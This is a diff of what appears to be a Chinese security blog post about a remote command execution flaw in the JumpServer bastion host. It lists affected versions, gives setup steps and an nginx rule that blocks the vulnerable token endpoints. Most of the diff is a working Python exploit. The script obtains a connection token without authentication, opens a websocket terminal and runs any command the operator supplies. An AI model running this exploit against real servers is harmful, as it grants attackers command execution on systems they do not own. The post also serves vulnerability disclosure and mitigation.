@@ -25,23 +25,23 @@ JumpServer 是全球首款开源的堡垒机，使用 GNU GPL v2.0 开源协议�
 
 受影响版本：
 
-·       < v2.6.2
+·       < v2.6.2
 
-·       < v2.5.4
+·       < v2.5.4
 
-·       < v2.4.5
+·       < v2.4.5
 
-·       = v1.5.9
+·       = v1.5.9
 
 不受影响版本：
 
-·       >= v2.6.2
+·       >= v2.6.2
 
-·       >= v2.5.4
+·       >= v2.5.4
 
-·       >= v2.4.5
+·       >= v2.4.5
 
-·       = v1.5.9 （版本号没变）
+·       = v1.5.9 （版本号没变）
 
 0x02 漏洞复现
 =========
@@ -53,7 +53,7 @@ JumpServer 是全球首款开源的堡垒机，使用 GNU GPL v2.0 开源协议�
 
 | 
 
-curl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh  | sh
+curl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh  | sh
 
  |
 
@@ -117,7 +117,7 @@ ws://xx.xx.xx.xx:8080/ws/ops/tasks/log/
 
 | 
 
-# -*- coding:  utf-8 -*-
+# -*- coding:  utf-8 -*-
 
 # import requests
 
@@ -127,23 +127,23 @@ ws://xx.xx.xx.xx:8080/ws/ops/tasks/log/
 
 #
 
-#  url_host='http://192.168.1.73:8080'
+#  url_host='http://192.168.1.73:8080'
 
 #
 
 # def get_token():
 
-#     url = url_host+'/api/v1/users/connection-token/?user-only=1'
+#     url = url_host+'/api/v1/users/connection-token/?user-only=1'
 
-#     url  =url_host+'/api/v1/authentication/connection-token/?user-only=1'
+#     url  =url_host+'/api/v1/authentication/connection-token/?user-only=1'
 
-#     response = requests.post(url,  json=data).json()
+#     response = requests.post(url,  json=data).json()
 
-#     print(response)
+#     print(response)
 
-#      ret=requests.get(url_host+'/api/v1/authentication/connection-token/?token=%s'%response['token'])
+#      ret=requests.get(url_host+'/api/v1/authentication/connection-token/?token=%s'%response['token'])
 
-#     print(ret.text)
+#     print(ret.text)
 
 # get_token()
 
@@ -155,121 +155,121 @@ import requests
 
 import json
 
-url =  "/api/v1/authentication/connection-token/?user-only=None"
+url =  "/api/v1/authentication/connection-token/?user-only=None"
 
 # 向服务器端发送认证后的消息
 
 async def send_msg(websocket,_text):
 
-    if _text == "exit":
+    if _text == "exit":
 
-        print(f'you have enter"exit", goodbye')
+        print(f'you have enter"exit", goodbye')
 
-        await  websocket.close(reason="user exit")
+        await  websocket.close(reason="user exit")
 
-        return False
+        return False
 
-    await websocket.send(_text)
+    await websocket.send(_text)
 
-    recv_text = await websocket.recv()
+    recv_text = await websocket.recv()
 
-    print(f"{recv_text}")
+    print(f"{recv_text}")
 
 # 客户端主逻辑
 
 async def main_logic(cmd):
 
-    print("#######start ws")
+    print("#######start ws")
 
-    async with websockets.connect(target) as  websocket:
+    async with websockets.connect(target) as  websocket:
 
-        recv_text = await websocket.recv()
+        recv_text = await websocket.recv()
 
-        print(f"{recv_text}")
+        print(f"{recv_text}")
 
-        resws=json.loads(recv_text)
+        resws=json.loads(recv_text)
 
-        id = resws['id']
+        id = resws['id']
 
-        print("get ws id:"+id)
+        print("get ws id:"+id)
 
-        print("###############")
+        print("###############")
 
-        print("init ws")
+        print("init ws")
 
-        print("###############")
+        print("###############")
 
-        inittext =  json.dumps({"id": id, "type": "TERMINAL_INIT",  "data":  "{\"cols\":164,\"rows\":17}"})
+        inittext =  json.dumps({"id": id, "type": "TERMINAL_INIT",  "data":  "{\"cols\":164,\"rows\":17}"})
 
-        await send_msg(websocket,inittext)
+        await send_msg(websocket,inittext)
 
-        for i in range(20):
+        for i in range(20):
 
-            recv_text = await  websocket.recv()
+            recv_text = await  websocket.recv()
 
-            print(f"{recv_text}")
+            print(f"{recv_text}")
 
-        print("###############")
+        print("###############")
 
-        print("exec cmd: ls")
+        print("exec cmd: ls")
 
-        cmdtext = json.dumps({"id":  id, "type": "TERMINAL_DATA", "data":  cmd+"\r\n"})
+        cmdtext = json.dumps({"id":  id, "type": "TERMINAL_DATA", "data":  cmd+"\r\n"})
 
-        print(cmdtext)
+        print(cmdtext)
 
-        await send_msg(websocket, cmdtext)
+        await send_msg(websocket, cmdtext)
 
-        for i in range(20):
+        for i in range(20):
 
-            recv_text = await  websocket.recv()
+            recv_text = await  websocket.recv()
 
-            print(f"{recv_text}")
+            print(f"{recv_text}")
 
-        print('#######finish')
+        print('#######finish')
 
 if __name__ == '__main__':
 
-    try:
+    try:
 
-        import sys
+        import sys
 
-        host=sys.argv[1]
+        host=sys.argv[1]
 
-        cmd=sys.argv[2]
+        cmd=sys.argv[2]
 
-        if host[-1]=='/':
+        if host[-1]=='/':
 
-            host=host[:-1]
+            host=host[:-1]
 
-        print(host)
+        print(host)
 
-        data = {"user":  "4320ce47-e0e0-4b86-adb1-675ca611ea0c", "asset":  "ccb9c6d7-6221-445e-9fcc-b30c95162825",
+        data = {"user":  "4320ce47-e0e0-4b86-adb1-675ca611ea0c", "asset":  "ccb9c6d7-6221-445e-9fcc-b30c95162825",
 
-                "system_user":  "79655e4e-1741-46af-a793-fff394540a52"}
+                "system_user":  "79655e4e-1741-46af-a793-fff394540a52"}
 
-        print("##################")
+        print("##################")
 
-        print("get token url:%s" %  (host + url,))
+        print("get token url:%s" %  (host + url,))
 
-        print("##################")
+        print("##################")
 
-        res = requests.post(host + url,  json=data)
+        res = requests.post(host + url,  json=data)
 
-        token = res.json()["token"]
+        token = res.json()["token"]
 
-        print("token:%s", (token,))
+        print("token:%s", (token,))
 
-        print("##################")
+        print("##################")
 
-        target = "ws://" +  host.replace("http://", '') +"/koko/ws/token/?target_id=" + token
+        target = "ws://" +  host.replace("http://", '') +"/koko/ws/token/?target_id=" + token
 
-        print("target ws:%s" %  (target,))
+        print("target ws:%s" %  (target,))
 
-         asyncio.get_event_loop().run_until_complete(main_logic(cmd))
+         asyncio.get_event_loop().run_until_complete(main_logic(cmd))
 
-    except:
+    except:
 
-        print("python jumpserver.py  http://192.168.1.73 whoami")
+        print("python jumpserver.py  http://192.168.1.73 whoami")
 
  |
 
@@ -310,15 +310,15 @@ Nginx 配置文件实例为：
 
 ### 保证在 /api 之前和 / 之前
 
-location  /api/v1/authentication/connection-token/ {
+location  /api/v1/authentication/connection-token/ {
 
-   return 403;
+   return 403;
 
 }
 
-location  /api/v1/users/connection-token/ {
+location  /api/v1/users/connection-token/ {
 
-   return 403;
+   return 403;
 
 }
 
@@ -326,15 +326,15 @@ location  /api/v1/users/connection-token/ {
 
 location /api/ {
 
-    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Real-IP $remote_addr;
 
-    proxy_set_header Host $host;
+    proxy_set_header Host $host;
 
-    proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
 
-    proxy_pass http://core:8080;
+    proxy_pass http://core:8080;
 
-   }
+   }
 
 ……
 
@@ -346,7 +346,7 @@ END
 
 十九线菜鸟学安全∣微信公众号
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/IlslviaDrQibPaGHmTufJJUyKaQM9hX55sJRVxKsk8lP2ZWAHLVDKkqGfXg2WOJHLAbPYdFAibC9RsRqwONI0d4dw/640?wx_fmt=jpeg)  ![](https://mmbiz.qpic.cn/mmbiz/Hu8hctxHqSW0nSJn8p8OHVEQwHicSwTibFJMBE650AxdzfISoeY8woe2QsgCINIBrccBOOUft2HuU0GsNQWibSG7g/640?wx_fmt=png)
+![](https://mmbiz.qpic.cn/mmbiz_jpg/IlslviaDrQibPaGHmTufJJUyKaQM9hX55sJRVxKsk8lP2ZWAHLVDKkqGfXg2WOJHLAbPYdFAibC9RsRqwONI0d4dw/640?wx_fmt=jpeg)  ![](https://mmbiz.qpic.cn/mmbiz/Hu8hctxHqSW0nSJn8p8OHVEQwHicSwTibFJMBE650AxdzfISoeY8woe2QsgCINIBrccBOOUft2HuU0GsNQWibSG7g/640?wx_fmt=png)
 
 长按识别二维码，期待与大家交流心得
 
